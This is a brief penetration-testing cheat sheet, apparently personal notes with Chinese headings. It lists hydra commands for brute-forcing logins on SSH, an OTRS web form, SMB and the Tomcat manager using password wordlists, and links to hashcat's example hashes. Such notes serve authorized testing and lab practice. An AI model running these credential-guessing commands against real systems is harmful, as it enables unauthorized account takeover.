https://hashcat.net/wiki/doku.php?id=example_hashes


## ssh 登录枚举

```bash
hydra -l <USER> -P /usr/share/wordlists/wfuzz/others/common_pass.txt ssh://<IP>
hydra -l root -P ssh_password.txt <IP> ssh
```

## POST 登录枚举

```bash
hydra -l 'root@localhost' -P `pwd`/cewl_passlist.txt <IP> http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed"
```

## SMB 枚举

```bash
 hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb
```

## Tomcat 枚举

```bash
hydra -L users.txt -P passwd.txt -t 20 <IP> -s 8080 http-get /manager/html
hydra -C /home/kali/tools/DictionaryTools/IntruderPayloads/Repositories/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://<IP>:8080/manager/html
```

